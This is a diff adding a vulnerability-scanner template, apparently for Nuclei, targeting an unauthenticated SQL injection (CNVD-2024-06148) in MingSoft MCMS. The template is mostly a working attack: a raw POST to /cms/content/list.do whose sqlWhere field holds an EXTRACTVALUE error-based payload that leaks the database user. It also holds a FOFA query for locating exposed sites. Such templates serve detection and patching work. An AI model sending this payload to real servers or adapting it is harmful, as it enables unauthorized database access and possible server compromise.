@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'java.sql.SQLException: XPATH'
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /cms/content/list.do HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+id: mingfeiCMS-sql-CNVD-2024-06148
+info:
+    author: Superhero
+    description: |-
+        fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+        由于铭飞CMS 文章列表接口content/list.do中的sqlWhere参数缺少对外部输入SQL语句的验证，未经身份验证的攻击者可利用该漏洞获取数据库敏感数据，进一步利用可获取服务器权限。
+    name: 铭飞CMS SQL注入漏洞(CNVD-2024-06148)
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140300863
+    severity: high
+    tags:
+        - 铭飞CMS
+        - MCMS
+        - mcms
